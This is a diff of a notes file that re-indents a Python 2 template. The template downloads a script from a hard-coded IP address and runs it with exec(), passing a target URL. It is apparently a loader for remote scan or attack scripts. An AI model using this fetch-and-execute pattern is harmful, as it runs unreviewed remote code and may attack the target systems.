@@ -6,12 +6,12 @@
 2020年5月17日20:09:03
 pythonTemplate:
 ```python
-import requests
-import sys
-reload(sys)
-sys.setdefaultencoding( "utf-8" )
-str=requests.get("http://118.24.120.71:8088/static/"+sys.argv[1]).text
-exec(str,{"targerUrl":sys.argv[2]})
+    import requests
+    import sys
+    reload(sys)
+    sys.setdefaultencoding( "utf-8" )
+    str=requests.get("http://118.24.120.71:8088/static/"+sys.argv[1]).text
+    exec(str,{"targerUrl":sys.argv[2]})
 ```
 
 2020年6月4日20:12:22
